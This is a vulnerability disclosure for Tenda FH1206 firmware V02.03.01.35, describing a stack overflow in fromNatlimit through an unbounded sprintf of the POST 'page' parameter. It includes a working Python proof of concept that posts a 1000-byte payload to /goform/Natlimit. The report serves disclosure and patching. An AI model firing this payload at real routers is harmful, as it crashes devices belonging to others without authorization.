## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2905.html

## Affected version

FH1206 V02.03.01.35

## Vulnerability details

The Tenda FH1206 V02.03.01.35 has a stack overflow vulnerability located in the `fromNatlimit` function. This function accepts the `page` parameter from a POST request. The statement `sprintf(v4, "lan_controllist.asp?page=%s", v2);` leads to a buffer overflow. The user-supplied `page` can exceed the capacity of the `v4` array, thus triggering this security vulnerability.

![image-20240802202621283](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240802202621283.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/Natlimit"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801202321673.png)